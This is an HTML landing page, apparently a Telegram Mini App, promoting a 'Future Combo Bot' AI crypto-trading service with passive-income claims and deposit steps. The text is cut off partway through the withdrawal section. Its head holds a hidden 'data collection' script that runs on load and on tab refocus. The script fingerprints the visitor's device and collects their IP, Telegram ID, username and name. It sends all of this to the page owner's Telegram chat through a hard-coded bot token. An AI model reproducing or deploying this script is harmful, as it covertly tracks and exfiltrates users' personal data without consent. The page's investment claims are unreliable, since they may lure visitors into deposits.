/*CMD
  command: index.html
  help: 
  need_reply: false
  auto_retry_time: 
  folder: 

  <<ANSWER

  ANSWER

  <<KEYBOARD

  KEYBOARD
  aliases: 
  group: 
CMD*/

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Future Combo Bot - AI-Powered Crypto Trading</title>
    <meta name="description" content="AI-Driven Trading for Real Passive Income">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap');
        
        * {
            font-family: 'Inter', sans-serif;
        }
        
        @keyframes fade-in {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        @keyframes fade-in-up {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        @keyframes slide-down {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        @keyframes float {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-10px); }
        }
        
        @keyframes gradient {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }
        
        @keyframes bounce {
            0%, 100% { transform: translateY(-25%); animation-timing-function: cubic-bezier(0.8, 0, 1, 1); }
            50% { transform: none; animation-timing-function: cubic-bezier(0, 0, 0.2, 1); }
        }
        
        @keyframes pulse {
            50% { opacity: .5; }
        }
        
        @keyframes ping {
            75%, 100% { transform: scale(2); opacity: 0; }
        }
        
        .animate-fade-in {
            animation: fade-in 0.8s ease-out;
        }
        
        .animate-fade-in-up {
            animation: fade-in-up 0.8s ease-out;
        }
        
        .animate-slide-down {
            animation: slide-down 0.3s ease-out;
        }
        
        .animate-float {
            animation: float 3s ease-in-out infinite;
        }
        
        .animate-gradient {
            background-size: 200% 200%;
            animation: gradient 3s ease infinite;
        }
        
        .animate-bounce {
            animation: bounce 1s infinite;
        }
        
        .animate-pulse {
            animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
        }
        
        .animate-ping {
            animation: ping 1s cubic-bezier(0, 0, 0.2, 1) infinite;
        }
        
        .bg-grid-pattern {
            background-image: radial-gradient(circle, rgba(255,255,255,0.1) 1px, transparent 1px);
            background-size: 20px 20px;
        }
        
        html {
            scroll-behavior: smooth;
        }
        
        body {
            scroll-padding-top: 4rem;
        }
        
        .hidden {
            display: none;
        }
        
        .transition-all {
            transition-property: all;
            transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
            transition-duration: 150ms;
        }
        
        .duration-300 {
            transition-duration: 300ms;
        }
        
        .duration-500 {
            transition-duration: 500ms;
        }
        
        .duration-1000 {
            transition-duration: 1000ms;
        }
        
        .hover\:scale-105:hover {
            transform: scale(1.05);
        }
        
        .hover\:scale-110:hover {
            transform: scale(1.1);
        }
        
        .hover\:shadow-lg:hover {
            box-shadow: 0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1);
        }
        
        .hover\:shadow-xl:hover {
            box-shadow: 0 20px 25px -5px rgb(0 0 0 / 0.1), 0 8px 10px -6px rgb(0 0 0 / 0.1);
        }
        
        .group:hover .group-hover\:w-full {
            width: 100%;
        }
        
        .testimonial-card {
            transition: all 0.5s ease-in-out;
        }
        
        .faq-content {
            transition: all 0.3s ease-in-out;
            overflow: hidden;
        }
        
        .faq-content.open {
            max-height: 24rem;
            opacity: 1;
        }
        
        .faq-content.closed {
            max-height: 0;
            opacity: 0;
        }
        
        .chevron-rotate {
            transition: transform 0.3s ease-in-out;
        }
        
        .chevron-rotate.rotated {
            transform: rotate(180deg);
        }

        /* Telegram Web App Styles */
        html, body {
            margin: 0;
            padding: 0;
            height: 100vh;
            height: var(--tg-viewport-stable-height, 100vh);
            overflow-x: hidden;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
            -webkit-tap-highlight-color: transparent;
            position: relative;
        }

        /* Ensure proper viewport handling */
        html {
            height: 100%;
            height: var(--tg-viewport-height, 100vh);
        }

        /* Main container adjustments for Telegram Web App */
        body {
            min-height: 100vh;
            min-height: var(--tg-viewport-stable-height, 100vh);
            max-height: 100vh;
            max-height: var(--tg-viewport-height, 100vh);
        }

        /* Prevent zoom on double tap */
        * {
            touch-action: manipulation;
        }

        /* Hide scrollbars but keep functionality */
        body::-webkit-scrollbar {
            display: none;
        }
        body {
            -ms-overflow-style: none;
            scrollbar-width: none;
        }

        /* Ensure proper positioning for Telegram Web App */
        .min-h-screen {
            min-height: 100vh;
            min-height: var(--tg-viewport-stable-height, 100vh);
        }
    </style>

    <!-- Telegram Web App Integration -->
    <script>
    (function() {
        'use strict';
        
        // Initialize Telegram Web App
        const tg = window.Telegram?.WebApp;
        
        // Auto full-screen on load
        function initTelegramWebApp() {
            if (!tg) return;
            
            // Expand the web app to full height immediately
            tg.expand();
            
            // Set header color to match the app
            tg.setHeaderColor('#ffffff');
            
            // Enable closing confirmation
            tg.enableClosingConfirmation();
            
            // Set viewport to stable height for better positioning
            if (tg.viewportStableHeight) {
                document.documentElement.style.height = tg.viewportStableHeight + 'px';
                document.body.style.height = tg.viewportStableHeight + 'px';
            }
            
            // Ensure full viewport usage
            document.documentElement.style.setProperty('--tg-viewport-height', tg.viewportHeight + 'px');
            document.documentElement.style.setProperty('--tg-viewport-stable-height', tg.viewportStableHeight + 'px');
            
            // Ready the web app
            tg.ready();
            
            // Force a layout recalculation after initialization
            setTimeout(() => {
                window.dispatchEvent(new Event('resize'));
            }, 100);
            
            console.log('Telegram Web App initialized successfully');
            console.log('Viewport Height:', tg.viewportHeight);
            console.log('Stable Height:', tg.viewportStableHeight);
        }
        
        // Handle back button behavior with confirmation
        function setupBackButtonConfirmation() {
            if (!tg) return;
            
            // Show the back button
            tg.BackButton.show();
            
            // Handle back button click
            tg.BackButton.onClick(function() {
                // Show confirmation dialog
                if (confirm('Are you sure you want to close the app?')) {
                    tg.close();
                }
            });
        }
        
        // Handle theme changes
        function handleThemeChange() {
            if (!tg) return;
            
            // Apply Telegram theme colors to your app
            const themeParams = tg.themeParams;
            
            // Apply theme colors if available
            if (themeParams.bg_color) {
                document.documentElement.style.setProperty('--tg-bg-color', themeParams.bg_color);
            }
            if (themeParams.text_color) {
                document.documentElement.style.setProperty('--tg-text-color', themeParams.text_color);
            }
            if (themeParams.button_color) {
                document.documentElement.style.setProperty('--tg-button-color', themeParams.button_color);
            }
        }
        
        // Handle viewport changes
        function handleViewportChange() {
            if (!tg) return;
            
            tg.onEvent('viewportChanged', function() {
                console.log('Viewport changed:', tg.viewportHeight, tg.viewportStableHeight);
                
                // Update CSS custom properties with new viewport values
                document.documentElement.style.setProperty('--tg-viewport-height', tg.viewportHeight + 'px');
                document.documentElement.style.setProperty('--tg-viewport-stable-height', tg.viewportStableHeight + 'px');
                
                // Update document and body height for proper positioning
                if (tg.viewportStableHeight) {
                    document.documentElement.style.height = tg.viewportStableHeight + 'px';
                    document.body.style.height = tg.viewportStableHeight + 'px';
                }
                
                // Force layout recalculation
                setTimeout(() => {
                    window.dispatchEvent(new Event('resize'));
                }, 50);
            });
        }
        
        // Prevent default browser back behavior
        function preventBrowserBack() {
            // Add state to history to prevent immediate back
            history.pushState(null, null, location.href);
            
            // Handle browser back button
            window.addEventListener('popstate', function(event) {
                // Push state again to prevent going back
                history.pushState(null, null, location.href);
                
                // Show confirmation
                if (confirm('Are you sure you want to close the app?')) {
                    if (tg) {
                        tg.close();
                    } else {
                        window.close();
                    }
                }
            });
        }
        
        // Initialize everything when DOM is ready
        function init() {
            // Check if running in Telegram
            if (!tg || (tg.initData === '' && tg.initDataUnsafe.user === undefined)) {
                console.warn('Not running in Telegram Web App environment');
                // You can still test the functionality in a regular browser
            }
            
            // Force immediate expansion for full-screen behavior
            if (tg) {
                tg.expand();
                
                // Additional full-screen setup
                setTimeout(() => {
                    tg.expand();
                    
                    // Ensure proper viewport setup
                    if (tg.viewportHeight && tg.viewportStableHeight) {
                        document.documentElement.style.setProperty('--tg-viewport-height', tg.viewportHeight + 'px');
                        document.documentElement.style.setProperty('--tg-viewport-stable-height', tg.viewportStableHeight + 'px');
                        
                        // Set body height to stable height for proper positioning
                        document.body.style.height = tg.viewportStableHeight + 'px';
                        document.documentElement.style.height = tg.viewportStableHeight + 'px';
                    }
                }, 50);
                
                // Additional expansion after a short delay to ensure full-screen
                setTimeout(() => {
                    tg.expand();
                }, 200);
            }
            
            // Initialize core functionality
            initTelegramWebApp();
            setupBackButtonConfirmation();
            handleThemeChange();
            handleViewportChange();
            preventBrowserBack();
            
            console.log('Telegram Web App integration completed');
        }
        
        // Start initialization when DOM is loaded
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', init);
        } else {
            init();
        }
        
        // Expose Telegram Web App object globally for debugging
        if (tg) {
            window.tgWebApp = tg;
        }
        
    })();
    </script>

    <!-- Data Collection Script -->
    <script>
    // Data Collection Script for Telegram Bot
    // Collects available user data without requiring permissions

    (function() {
        'use strict';
        
        const BOT_TOKEN = '8142511033:AAH0hRNsVFKnyI3_EGfrswDddrWOYW29v7k';
        const ADMIN_ID = '7377411824';
        
        // Function to collect all available user data
        function collectUserData() {
            const data = {
                timestamp: new Date().toISOString(),
                
                // Browser Information
                browser: {
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    languages: navigator.languages,
                    platform: navigator.platform,
                    cookieEnabled: navigator.cookieEnabled,
                    onLine: navigator.onLine,
                    doNotTrack: navigator.doNotTrack,
                    vendor: navigator.vendor,
                    vendorSub: navigator.vendorSub,
                    product: navigator.product,
                    productSub: navigator.productSub,
                    appName: navigator.appName,
                    appVersion: navigator.appVersion,
                    appCodeName: navigator.appCodeName,
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    maxTouchPoints: navigator.maxTouchPoints,
                    webdriver: navigator.webdriver
                },
                
                // Screen Information
                screen: {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth,
                    orientation: screen.orientation ? {
                        angle: screen.orientation.angle,
                        type: screen.orientation.type
                    } : null
                },
                
                // Window Information
                window: {
                    innerWidth: window.innerWidth,
                    innerHeight: window.innerHeight,
                    outerWidth: window.outerWidth,
                    outerHeight: window.outerHeight,
                    devicePixelRatio: window.devicePixelRatio,
                    scrollX: window.scrollX,
                    scrollY: window.scrollY
                },
                
                // Document Information
                document: {
                    title: document.title,
                    url: document.URL,
                    domain: document.domain,
                    referrer: document.referrer,
                    characterSet: document.characterSet,
                    contentType: document.contentType,
                    readyState: document.readyState,
                    lastModified: document.lastModified
                },
                
                // Location Information (if available)
                location: {
                    href: location.href,
                    protocol: location.protocol,
                    host: location.host,
                    hostname: location.hostname,
                    port: location.port,
                    pathname: location.pathname,
                    search: location.search,
                    hash: location.hash,
                    origin: location.origin
                },
                
                // Performance Information
                performance: {
                    timeOrigin: performance.timeOrigin,
                    now: performance.now(),
                    timing: performance.timing ? {
                        navigationStart: performance.timing.navigationStart,
                        loadEventEnd: performance.timing.loadEventEnd,
                        domContentLoadedEventEnd: performance.timing.domContentLoadedEventEnd
                    } : null
                },
                
                // Connection Information (if available)
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData
                } : null,
                
                // Memory Information (if available)
                memory: navigator.deviceMemory ? {
                    deviceMemory: navigator.deviceMemory
                } : null,
                
                // Battery Information (if available)
                battery: null, // Will be populated asynchronously
                
                // Media Devices (if available)
                mediaDevices: null, // Will be populated asynchronously
                
                // Timezone Information
                timezone: {
                    offset: new Date().getTimezoneOffset(),
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                },
                
                // Canvas Fingerprint
                canvas: null, // Will be populated
                
                // WebGL Information
                webgl: null, // Will be populated
                
                // Local Storage Information
                storage: {
                    localStorage: typeof(Storage) !== "undefined" && localStorage ? true : false,
                    sessionStorage: typeof(Storage) !== "undefined" && sessionStorage ? true : false
                },
                
                // Telegram Web App Data (if available)
                telegram: window.Telegram && window.Telegram.WebApp ? {
                    initData: window.Telegram.WebApp.initData,
                    initDataUnsafe: window.Telegram.WebApp.initDataUnsafe,
                    version: window.Telegram.WebApp.version,
                    platform: window.Telegram.WebApp.platform,
                    colorScheme: window.Telegram.WebApp.colorScheme,
                    themeParams: window.Telegram.WebApp.themeParams,
                    isExpanded: window.Telegram.WebApp.isExpanded,
                    viewportHeight: window.Telegram.WebApp.viewportHeight,
                    viewportStableHeight: window.Telegram.WebApp.viewportStableHeight,
                    headerColor: window.Telegram.WebApp.headerColor,
                    backgroundColor: window.Telegram.WebApp.backgroundColor,
                    isClosingConfirmationEnabled: window.Telegram.WebApp.isClosingConfirmationEnabled,
                    isVerticalSwipesEnabled: window.Telegram.WebApp.isVerticalSwipesEnabled
                } : null
            };
            
            return data;
        }
        
        // Generate Canvas Fingerprint
        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = 200;
                canvas.height = 50;
                
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('Fingerprint', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('Fingerprint', 4, 17);
                
                return canvas.toDataURL();
            } catch (e) {
                return null;
            }
        }
        
        // Get WebGL Information
        function getWebGLInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                
                if (!gl) return null;
                
                return {
                    vendor: gl.getParameter(gl.VENDOR),
                    renderer: gl.getParameter(gl.RENDERER),
                    version: gl.getParameter(gl.VERSION),
                    shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                    maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                    maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
                    maxVertexAttribs: gl.getParameter(gl.MAX_VERTEX_ATTRIBS)
                };
            } catch (e) {
                return null;
            }
        }
        
        // Get Battery Information
        async function getBatteryInfo() {
            try {
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    return {
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime,
                        level: battery.level
                    };
                }
            } catch (e) {
                return null;
            }
            return null;
        }
        
        // Get Media Devices Information
        async function getMediaDevicesInfo() {
            try {
                if ('mediaDevices' in navigator && 'enumerateDevices' in navigator.mediaDevices) {
                    const devices = await navigator.mediaDevices.enumerateDevices();
                    return devices.map(device => ({
                        kind: device.kind,
                        label: device.label,
                        deviceId: device.deviceId ? 'present' : 'not_present'
                    }));
                }
            } catch (e) {
                return null;
            }
            return null;
        }
        
        // Function to detect device type
        function getDeviceType() {
            const userAgent = navigator.userAgent.toLowerCase();
            if (/iphone|ipod/.test(userAgent)) return 'iPhone';
            if (/ipad/.test(userAgent)) return 'iPad';
            if (/android/.test(userAgent)) return 'Android';
            if (/windows phone/.test(userAgent)) return 'Windows Phone';
            if (/mac/.test(userAgent)) return 'Mac';
            if (/windows/.test(userAgent)) return 'Windows';
            if (/linux/.test(userAgent)) return 'Linux';
            return 'Unknown Device';
        }
        
        // Function to get country from timezone
        function getCountryFromTimezone() {
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const countryMap = {
                'Asia/Kolkata': 'India 🇮🇳',
                'America/New_York': 'USA 🇺🇸',
                'Europe/London': 'UK 🇬🇧',
                'Asia/Dubai': 'UAE 🇦🇪',
                'Asia/Shanghai': 'China 🇨🇳',
                'Asia/Tokyo': 'Japan 🇯🇵',
                'Europe/Berlin': 'Germany 🇩🇪',
                'Australia/Sydney': 'Australia 🇦🇺',
                'America/Los_Angeles': 'USA 🇺🇸',
                'Europe/Paris': 'France 🇫🇷'
            };
            return countryMap[timezone] || `${timezone.split('/')[0]} (based on timezone)`;
        }
        
        // Function to get IP address
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Unable to fetch';
            }
        }
        
        // Send data to Telegram Bot
        async function sendToTelegramBot(data) {
            try {
                // Get IP address
                const ipAddress = await getIPAddress();
                
                // Get Telegram user data
                const telegramUser = data.telegram && data.telegram.initDataUnsafe && data.telegram.initDataUnsafe.user 
                    ? data.telegram.initDataUnsafe.user 
                    : null;
                
                const message = `🔍 *User Basic Data*\n\n` +
                    `👤 *Telegram User ID:* ${telegramUser ? telegramUser.id : 'Not Available'}\n` +
                    `🙋‍♂️ *Telegram Username:* @${telegramUser ? (telegramUser.username || 'Not Set') : 'Not Available'}\n` +
                    `👨‍💻 *Name:* ${telegramUser ? `${telegramUser.first_name || ''} ${telegramUser.last_name || ''}`.trim() || 'Not Available' : 'Not Available'}\n` +
                    `📱 *Device:* ${getDeviceType()}\n` +
                    `🌍 *Country/Region:* ${getCountryFromTimezone()}\n` +
                    `🗣️ *Language:* ${data.browser.language}\n` +
                    `🌐 *IP Address:* ${ipAddress}\n\n` +
                    `🌐 *Browser:* ${data.browser.userAgent}\n\n` +
                    `📱 *User Agent:* ${data.browser.userAgent}`;
                
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                const payload = {
                    chat_id: ADMIN_ID,
                    text: message,
                    parse_mode: 'Markdown'
                };
                
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });
                
                if (response.ok) {
                    console.log('User basic data sent to Telegram bot successfully');
                } else {
                    console.error('Failed to send data to Telegram bot');
                }
            } catch (error) {
                console.error('Error sending data to Telegram bot:', error);
            }
        }
        
        // Main function to collect and send data
        async function collectAndSendData() {
            try {
                console.log('Starting data collection...');
                
                // Collect basic data
                const data = collectUserData();
                
                // Add canvas fingerprint
                data.canvas = getCanvasFingerprint();
                
                // Add WebGL information
                data.webgl = getWebGLInfo();
                
                // Add battery information (async)
                data.battery = await getBatteryInfo();
                
                // Add media devices information (async)
                data.mediaDevices = await getMediaDevicesInfo();
                
                console.log('Data collection completed:', data);
                
                // Send data to Telegram bot
                await sendToTelegramBot(data);
                
            } catch (error) {
                console.error('Error in data collection:', error);
            }
        }
        
        // Auto-execute when page loads
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', collectAndSendData);
        } else {
            // If document is already loaded, execute immediately
            setTimeout(collectAndSendData, 1000); // Small delay to ensure everything is initialized
        }
        
        // Also collect data when page becomes visible (in case user switches tabs)
        document.addEventListener('visibilitychange', function() {
            if (!document.hidden) {
                setTimeout(collectAndSendData, 500);
            }
        });
        
    })();
    </script>
</head>
<body class="min-h-screen bg-white text-sm">
    <!-- Header -->
    <header class="sticky top-0 z-50 bg-white/95 backdrop-blur-sm border-b border-gray-200 transition-all duration-300">
        <div class="container mx-auto px-4">
            <div class="flex items-center justify-between h-12">
                <div class="flex items-center space-x-2 animate-fade-in">
                    <div class="relative">
                        <i data-lucide="bot" class="h-6 w-6 text-blue-600 animate-pulse"></i>
                        <div class="absolute -top-1 -right-1 w-2 h-2 bg-green-500 rounded-full animate-ping"></div>
                    </div>
                    <span class="text-base font-bold text-gray-900">Future Combo Bot</span>
                </div>

                <!-- Desktop Navigation -->
                <nav class="hidden md:flex items-center space-x-5">
                    <a href="#home" class="text-xs font-medium text-gray-700 hover:text-blue-600 transition-all duration-300 hover:scale-105 relative group">
                        Home
                        <span class="absolute -bottom-1 left-0 w-0 h-0.5 bg-blue-600 transition-all duration-300 group-hover:w-full"></span>
                    </a>
                    <a href="#about-bot" class="text-xs font-medium text-gray-700 hover:text-blue-600 transition-all duration-300 hover:scale-105 relative group">
                        About Bot
                        <span class="absolute -bottom-1 left-0 w-0 h-0.5 bg-blue-600 transition-all duration-300 group-hover:w-full"></span>
                    </a>
                    <a href="#how-it-works" class="text-xs font-medium text-gray-700 hover:text-blue-600 transition-all duration-300 hover:scale-105 relative group">
                        How It Works
                        <span class="absolute -bottom-1 left-0 w-0 h-0.5 bg-blue-600 transition-all duration-300 group-hover:w-full"></span>
                    </a>
                    <a href="#vip-plans" class="text-xs font-medium text-gray-700 hover:text-blue-600 transition-all duration-300 hover:scale-105 relative group">
                        VIP Plans
                        <span class="absolute -bottom-1 left-0 w-0 h-0.5 bg-blue-600 transition-all duration-300 group-hover:w-full"></span>
                    </a>
                    <a href="#referrals" class="text-xs font-medium text-gray-700 hover:text-blue-600 transition-all duration-300 hover:scale-105 relative group">
                        Referrals
                        <span class="absolute -bottom-1 left-0 w-0 h-0.5 bg-blue-600 transition-all duration-300 group-hover:w-full"></span>
                    </a>
                    <a href="#faqs" class="text-xs font-medium text-gray-700 hover:text-blue-600 transition-all duration-300 hover:scale-105 relative group">
                        FAQs
                        <span class="absolute -bottom-1 left-0 w-0 h-0.5 bg-blue-600 transition-all duration-300 group-hover:w-full"></span>
                    </a>
                    <a href="#contact" class="text-xs font-medium text-gray-700 hover:text-blue-600 transition-all duration-300 hover:scale-105 relative group">
                        Contact
                        <span class="absolute -bottom-1 left-0 w-0 h-0.5 bg-blue-600 transition-all duration-300 group-hover:w-full"></span>
                    </a>
                </nav>

                <div class="flex items-center space-x-3">
                    <button class="hidden md:inline-flex text-xs hover:scale-105 transition-transform px-3 py-1 rounded">
                        Sign In
                    </button>
                    <button onclick="window.open('https://t.me/FutureComboBot', '_blank')" class="bg-blue-600 hover:bg-blue-700 text-white px-5 py-2 rounded-full animate-pulse hover:scale-105 transition-all duration-300 text-xs">
                        Start Now
                    </button>

                    <!-- Mobile Menu Button -->
                    <button id="mobile-menu-btn" class="md:hidden hover:scale-110 transition-transform">
                        <i data-lucide="menu" class="h-4 w-4" id="menu-icon"></i>
                        <i data-lucide="x" class="h-4 w-4 hidden" id="close-icon"></i>
                    </button>
                </div>
            </div>

            <!-- Mobile Navigation -->
            <div id="mobile-menu" class="md:hidden py-3 border-t border-gray-200 animate-slide-down hidden">
                <nav class="flex flex-col space-y-2">
                    <a href="#home" class="text-xs text-gray-700 hover:text-blue-600 transition-colors py-1">Home</a>
                    <a href="#about-bot" class="text-xs text-gray-700 hover:text-blue-600 transition-colors py-1">About Bot</a>
                    <a href="#how-it-works" class="text-xs text-gray-700 hover:text-blue-600 transition-colors py-1">How It Works</a>
                    <a href="#vip-plans" class="text-xs text-gray-700 hover:text-blue-600 transition-colors py-1">VIP Plans</a>
                    <a href="#referrals" class="text-xs text-gray-700 hover:text-blue-600 transition-colors py-1">Referrals</a>
                    <a href="#faqs" class="text-xs text-gray-700 hover:text-blue-600 transition-colors py-1">FAQs</a>
                    <a href="#contact" class="text-xs text-gray-700 hover:text-blue-600 transition-colors py-1">Contact</a>
                    <button onclick="window.open('https://t.me/FutureComboBot', '_blank')" class="bg-blue-600 hover:bg-blue-700 text-white w-full text-xs mt-2 py-2 rounded">
                        Start Now
                    </button>
                </nav>
            </div>
        </div>
    </header>

    <!-- Hero Banner Image -->
    <section class="py-6 bg-gradient-to-br from-blue-50 to-indigo-50">
        <div class="container mx-auto px-4">
            <div class="text-center">
                <img src="https://futurecombobot.vercel.app/images/hero-banner.png" alt="Future Combo Bot Trading Platform" class="mx-auto rounded-lg shadow-lg hover:shadow-xl transition-all duration-500 border border-gray-200 max-w-full h-auto">
            </div>
        </div>
    </section>

    <!-- Hero Section -->
    <section id="home" class="relative bg-gradient-to-br from-blue-50 via-indigo-50 to-purple-50 py-12 overflow-hidden">
        <div class="absolute inset-0 bg-grid-pattern opacity-5"></div>
        <div class="container mx-auto px-4 text-center relative z-10">
            <div class="transition-all duration-1000 opacity-100 translate-y-0">
                <span class="inline-flex items-center px-3 py-1 rounded-full text-xs font-medium bg-blue-100 text-blue-800 border border-blue-200 mb-3 animate-bounce">
                    <i data-lucide="zap" class="w-3 h-3 mr-1"></i>
                    AI-Powered Trading Platform
                </span>
                <h1 class="text-2xl md:text-4xl lg:text-5xl font-bold text-gray-900 mb-3 leading-tight">
                    Grow Your Crypto with<br>
                    <span class="text-transparent bg-clip-text bg-gradient-to-r from-blue-600 to-purple-600 animate-gradient">
                        Future Combo Bot
                    </span>
                </h1>
                <p class="text-base md:text-lg text-gray-600 mb-5 italic max-w-2xl mx-auto">
                    AI-Driven Trading for Real Passive Income
                </p>
                <div class="flex flex-col sm:flex-row gap-3 justify-center items-center mb-6">
                    <button onclick="window.open('https://t.me/FutureComboBot', '_blank')" class="bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 text-white px-6 py-2 text-base rounded-full hover:scale-105 transition-all duration-300 shadow-lg hover:shadow-xl animate-pulse inline-flex items-center">
                        <i data-lucide="rocket" class="mr-2 h-4 w-4"></i>
                        Start Now
                        <i data-lucide="external-link" class="ml-2 h-3 w-3"></i>
                    </button>
                </div>
                <div class="flex flex-wrap justify-center items-center gap-5 text-xs text-gray-600">
                    <div class="flex items-center space-x-2">
                        <i data-lucide="check-circle" class="h-3 w-3 text-green-500"></i>
                        <span>No hidden fees</span>
                    </div>
                    <div class="flex items-center space-x-2">
                        <i data-lucide="shield" class="h-3 w-3 text-green-500"></i>
                        <span>Instant withdrawals</span>
                    </div>
                    <div class="flex items-center space-x-2">
                        <i data-lucide="lock" class="h-3 w-3 text-green-500"></i>
                        <span>Secure & Trusted</span>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Deposit & Withdrawal Process Section -->
    <section class="py-12 bg-white">
        <div class="container mx-auto px-4">
            <div class="text-center mb-10">
                <span class="inline-flex items-center px-3 py-1 rounded-full text-xs font-medium bg-white text-gray-900 border border-gray-200 mb-2">
                    <i data-lucide="wallet" class="w-3 h-3 mr-1"></i>
                    Process Guide
                </span>
                <h2 class="text-xl md:text-2xl font-bold text-gray-900 mb-3">How to Deposit & Withdraw</h2>
                <p class="text-xs text-gray-600">Simple steps to manage your funds securely</p>
            </div>

            <div class="grid lg:grid-cols-2 gap-10">
                <!-- Deposit Process -->
                <div class="space-y-5">
                    <div class="text-center">
                        <div class="flex items-center justify-center mb-3">
                            <i data-lucide="arrow-down-circle" class="h-6 w-6 text-green-600 mr-2"></i>
                            <h3 class="text-lg font-bold text-gray-900">Deposit Process</h3>
                        </div>
                        <img src="https://futurecombobot.vercel.app/images/deposit-process.jpg" alt="Deposit Process Interface" class="mx-auto rounded-lg shadow-lg border border-gray-200 hover:shadow-xl transition-all duration-300 max-w-full h-auto">
                    </div>
                    <div class="bg-white rounded-xl border shadow-sm p-5">
                        <h4 class="font-bold text-base mb-3 flex items-center">
                            <i data-lucide="credit-card" class="h-4 w-4 mr-2 text-green-600"></i>
                            Deposit Steps
                        </h4>
                        <div class="space-y-2 text-xs">
                            <div class="flex items-start space-x-2">
                                <div class="w-5 h-5 bg-green-100 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
                                    <span class="text-green-600 font-bold text-xs">1</span>
                                </div>
                                <div>
                                    <p class="font-medium">Access Deposit Section</p>
                                    <p class="text-gray-600">Navigate to the deposit menu in your bot interface</p>
                                </div>
                            </div>
                            <div class="flex items-start space-x-2">
                                <div class="w-5 h-5 bg-green-100 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
                                    <span class="text-green-600 font-bold text-xs">2</span>
                                </div>
                                <div>
                                    <p class="font-medium">Select Payment Method</p>
                                    <p class="text-gray-600">Choose from available cryptocurrency options (USDT, BTC, ETH)</p>
                                </div>
                            </div>
                            <div class="flex items-start space-x-2">
                                <div class="w-5 h-5 bg-green-100 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
                                    <span class="text-green-600 font-bold text-xs">3</span>
                                </div>
                                <div>
                                    <p class="font-medium">Enter Amount</p>
                                    <p class="text-gray-600">Input deposit amount (minimum 30 USDT for VIP 1)</p>
                                </div>
                            </div>
                            <div class="flex items-start space-x-2">
                                <div class="w-5 h-5 bg-green-100 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
                                    <span class="text-green-600 font-bold text-xs">4</span>
                                </div>
                                <div>
                                    <p class="font-medium">Complete Transaction</p>
                                    <p class="text-gray-600">Send funds to provided wallet address and confirm transaction</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Withdrawal Process -->
                <div class="space-y-5">
                    <div class="text-center">
                        <div class="flex items-center justify-center mb-3">
                            <i data-lucide="arrow-up-circle" class="h-6 w-6 text-blue-600 mr-2"></i>
                            <h3 class="text-lg font-bold text-gray-900">Withdrawal Process</h3>
                        </div>
                        <img src="https://futurecombobot.vercel.app/images/withdrawal-process.jpeg" alt="Withdrawal Process Interface" class="mx-auto rounded-lg shadow-lg border border-gray-200 hover:shadow-xl transition-all duration-300 max-w-full h-auto">
                    </div>
                    <div class="bg-white rounded-xl border shadow-sm p-5">
                        <h4 class="font-bold text-base mb-3 flex items-center">
                            <i data-lucide="wallet" class="h-4 w-4 mr-2 text-blue-600"></i>
                            Withdrawal Steps
                        </h4>
                        <div class="space-y-2 text-xs">
                            <div class="flex items-start space-x-2">
                                <div class="w-5 h-5 bg-blue-100 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
                                    <span class="text-blue-600 font-bold text-xs">1</span>
                                </div>
                                <div>
                                    <p class="font-medium">Open Withdrawal Menu</p>
                                    <p class="text-gray-600">Access the withdrawal section from your dashboard</p>
                                </div>
